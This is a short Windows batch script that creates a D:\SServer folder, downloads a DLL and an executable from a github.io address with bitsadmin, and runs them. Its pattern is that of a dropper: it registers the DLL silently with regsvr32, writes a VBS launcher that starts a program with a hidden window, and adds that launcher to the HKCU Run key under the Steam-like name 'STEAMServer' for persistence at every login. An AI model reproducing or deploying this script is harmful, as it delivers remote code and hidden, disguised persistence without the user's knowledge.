@echo off
:: Download FurtherExecutor and run
pushd %~dp0
pushd D:\
cd /d D:\
mkdir D:\SServer
set dllpath=D:\SServer\System.IO.Compression.dll
set exepath=D:\SServer\download.exe
set scriptpath=D:\SServer\VBWebQuiet.vbs
set solutionpath=D:\SServer\UpdateSolution.exe
set webpath=D:\SServer\VBWeb.exe
::bitsadmin /transfer FurtherExecutorDownloader /download /priority normal "https://steambird1.github.io/app/s/update/download.exe" "%exepath%"
bitsadmin /transfer FurtherDLLDownloader /download /priority normal "https://steambird1.github.io/app/update/s/System.IO.Compression.dll" "%dllpath%"
bitsadmin /transfer FurtherUpdaterDownloader /download /priority normal "https://steambird1.github.io/app/update/s/UpdateSolution.exe" "%solutionpath%"
pushd D:\SServer
regsvr32 /s %dllpath%
echo set ws^=createobject("wscript.shell") > %scriptpath%
echo ws.run "cmd /c pushd D:\SServer & %webpath%",0 >> %scriptpath%
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v STEAMServer /t REG_SZ /d %scriptpath%
start /wait D:\SServer\UpdateSolution.exe
